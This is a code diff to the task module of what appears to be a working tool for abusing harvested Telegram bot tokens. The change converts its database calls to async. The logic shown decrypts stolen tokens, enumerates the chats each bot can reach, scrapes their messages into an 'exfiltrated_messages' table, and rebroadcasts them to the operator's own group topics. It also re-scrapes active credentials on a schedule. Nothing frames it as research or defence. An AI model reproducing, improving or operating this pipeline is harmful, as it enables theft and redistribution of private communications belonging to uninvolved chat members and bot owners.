@@ -11,6 +11,12 @@ import logging
 
 logger = logging.getLogger("flow.tasks")
 
+# Helper for async DB execution
+async def async_execute(query_builder):
+    """Executes a Supabase query builder synchronously in a background thread."""
+    return await asyncio.to_thread(query_builder.execute)
+
+
 # Redis Client for Locking
 redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
 
@@ -39,7 +45,7 @@ async def _exfiltrate_logic(cred_id: str):
     await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
     
     # Fetch credential
-    response = db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id).execute()
+    response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id))
     if not response.data:
         logger.error(f"❌ [Exfil] Credential {cred_id} not found in DB.")
         return f"Credential {cred_id} not found."
@@ -58,7 +64,7 @@ async def _exfiltrate_logic(cred_id: str):
             # SELF-HEAL: Encrypt and update DB
             try:
                 new_enc = security.encrypt(bot_token)
-                db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id).execute()
+                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                 logger.info(f"    🩹 [Exfil] Self-healed unencrypted token for {cred_id}")
             except: pass
         else:
@@ -66,7 +72,7 @@ async def _exfiltrate_logic(cred_id: str):
     except Exception as e:
         # Invalid token or key mismatch
         logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
-        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
+        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
         return f"Decryption failed for {cred_id}: {e}"
 
     # Scrape
@@ -80,7 +86,7 @@ async def _exfiltrate_logic(cred_id: str):
         await broadcaster.send_log(f"✅ Scraped {len(messages)} messages.")
     except Exception as e:
         logger.error(f"❌ [Exfil] Scraper failed: {e}")
-        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
+        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
         return f"Scraping failed: {e}"
 
     # Save Messages (using UPSERT to prevent duplicates)
@@ -96,11 +102,11 @@ async def _exfiltrate_logic(cred_id: str):
             
         try:
             # Use upsert: insert if not exists, ignore if duplicate
-            result = db.table("exfiltrated_messages").upsert(
+            result = await async_execute(db.table("exfiltrated_messages").upsert(
                 db_payload,
                 on_conflict="credential_id,telegram_msg_id",  # Conflict columns
                 ignore_duplicates=True  # Don't update existing, just skip
-            ).execute()
+            ))
             
             if result.data:
                 new_count += 1
@@ -138,7 +144,7 @@ async def _enrich_logic(cred_id: str):
     broadcaster = BroadcasterService()
     await broadcaster.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
     # Fetch credential
-    response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
+    response = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id))
     if not response.data:
         logger.error(f"❌ [Enrich] Credential {cred_id} not found.")
         return f"Credential {cred_id} not found."
@@ -153,14 +159,14 @@ async def _enrich_logic(cred_id: str):
             # SELF-HEAL
             try:
                 new_enc = security.encrypt(bot_token)
-                db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id).execute()
+                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                 logger.info(f"    🩹 [Enrich] Self-healed unencrypted token for {cred_id}")
             except: pass
         else:
             bot_token = security.decrypt(record["bot_token"])
     except Exception as e:
         logger.error(f"❌ [Enrich] Decryption failed: {e}")
-        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
+        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
         return f"Decryption failed: {e}"
 
     # Discover
@@ -184,7 +190,7 @@ async def _enrich_logic(cred_id: str):
         # Valid token, but no open dialogs.
         logger.info(f"    [Enrich] No chats via API. Skipping Orphan Match (Disabled).")
         # Mark as 'active' - token works but truly no chats accessible
-        db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id).execute()
+        await async_execute(db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id))
         return "Token valid, but no chats found. Status updated to 'active'."
     
     # Logic if chats found...
@@ -221,10 +227,10 @@ async def _enrich_logic(cred_id: str):
     if topic_id:
         meta_payload["topic_id"] = topic_id
 
-    db.table("discovered_credentials").update({
+    await async_execute(db.table("discovered_credentials").update({
         "chat_id": first_chat["id"],
         "meta": meta_payload
-    }).eq("id", cred_id).execute()
+    }).eq("id", cred_id))
     
     # Trigger Exfiltration for Primary
     print(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
@@ -243,14 +249,14 @@ async def _enrich_logic(cred_id: str):
         if len(chats) > 1:
             # Update meta with list of other chats
             all_chat_ids = [c["id"] for c in chats]
-            db.table("discovered_credentials").update({
+            await async_execute(db.table("discovered_credentials").update({
                 "meta": {
                     "chat_name": first_chat["name"], 
                     "type": first_chat["type"], 
                     "enriched": True,
                     "all_chats": all_chat_ids
                 }
-            }).eq("id", cred_id).execute()
+            }).eq("id", cred_id))
             msg += f" (Found {len(chats)} total chats, tracking primary only)"
 
     return msg
@@ -306,12 +312,12 @@ async def _broadcast_logic():
     # 
     # NOTE: Supabase doesn't support complex OR conditions easily via Python client.
     # So we'll fetch unclaimed messages and check claim freshness in Python.
-    response = db.table("exfiltrated_messages")\
+    response = await async_execute(db.table("exfiltrated_messages")\
         .select("*, discovered_credentials!inner(meta)")\
         .eq("is_broadcasted", False)\
         .order("telegram_msg_id", desc=False)\
         .limit(20)\
-        .execute()
+        )
     
     messages = response.data
     if not messages:
@@ -339,11 +345,11 @@ async def _broadcast_logic():
             # 2. Only update if still valid to claim
             
             # First, get fresh state from DB
-            fresh = db.table("exfiltrated_messages")\
+            fresh = await async_execute(db.table("exfiltrated_messages")\
                 .select("is_broadcasted, broadcast_claimed_at")\
                 .eq("id", msg_id)\
                 .single()\
-                .execute()
+                )
             
             if not fresh.data:
                 logger.warning(f"    ⚠️ Message {msg_id} not found in DB, skipping")
@@ -375,11 +381,11 @@ async def _broadcast_logic():
             
             # Claim this message by setting claimed_at to NOW
             claim_time = datetime.now(timezone.utc).isoformat()
-            db.table("exfiltrated_messages")\
+            await async_execute(db.table("exfiltrated_messages")\
                 .update({"broadcast_claimed_at": claim_time})\
                 .eq("id", msg_id)\
                 .eq("is_broadcasted", False)\
-                .execute()
+                )
             
             logger.info(f"    📌 Claimed message {msg_id}")
             
@@ -415,7 +421,7 @@ async def _broadcast_logic():
                 # Determines if we need to fetch token for legacy fallback
                 if "unknown" in topic_name and not bot_id:
                      try:
-                        cred_res = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).single().execute()
+                        cred_res = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id).single())
                         if cred_res.data:
                             decrypted = security.decrypt(cred_res.data["bot_token"])
                             if ":" in decrypted:
@@ -431,7 +437,7 @@ async def _broadcast_logic():
                 
                 # Update DB
                 meta["topic_id"] = thread_id
-                db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
+                await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                 print(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
             
             # Update local cache
@@ -451,7 +457,7 @@ async def _broadcast_logic():
                     thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                     # Update DB
                     meta["topic_id"] = thread_id
-                    db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id).execute()
+                    await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                     # Update Cache so subsequent messages in this batch don't recreate again
                     cached_topic_ids[cred_id] = thread_id
                     # Retry Send
@@ -467,19 +473,19 @@ async def _broadcast_logic():
                 # ==============================================
                 # SUCCESS: Mark as broadcasted and clear claim
                 # ==============================================
-                db.table("exfiltrated_messages").update({
+                await async_execute(db.table("exfiltrated_messages").update({
                     "is_broadcasted": True,
                     "broadcast_claimed_at": None  # Clear claim
-                }).eq("id", msg_id).execute()
+                }).eq("id", msg_id))
                 sent_count += 1
                 logger.info(f"    ✅ Broadcasted msg {msg_id}")
             else:
                 # ==============================================
                 # FAILED: Clear claim so it can be retried
                 # ==============================================
-                db.table("exfiltrated_messages").update({
+                await async_execute(db.table("exfiltrated_messages").update({
                     "broadcast_claimed_at": None
-                }).eq("id", msg_id).execute()
+                }).eq("id", msg_id))
                 logger.warning(f"    🔄 Cleared claim for retry: {msg_id}")
             
             # Rate limit
@@ -489,9 +495,9 @@ async def _broadcast_logic():
             print(f"Error broadcasting msg {msg_id}: {e}")
             # Clear claim on error so message can be retried
             try:
-                db.table("exfiltrated_messages").update({
+                await async_execute(db.table("exfiltrated_messages").update({
                     "broadcast_claimed_at": None
-                }).eq("id", msg_id).execute()
+                }).eq("id", msg_id))
             except:
                 pass  # Best effort cleanup
             continue
@@ -572,11 +578,11 @@ async def _rescrape_active_logic():
     
     try:
         # Get all active credentials that have a chat_id (ready to scrape)
-        response = db.table("discovered_credentials")\
+        response = await async_execute(db.table("discovered_credentials")\
             .select("id")\
             .eq("status", "active")\
             .not_.is_("chat_id", "null")\
-            .execute()
+            )
         
         credentials = response.data or []
         
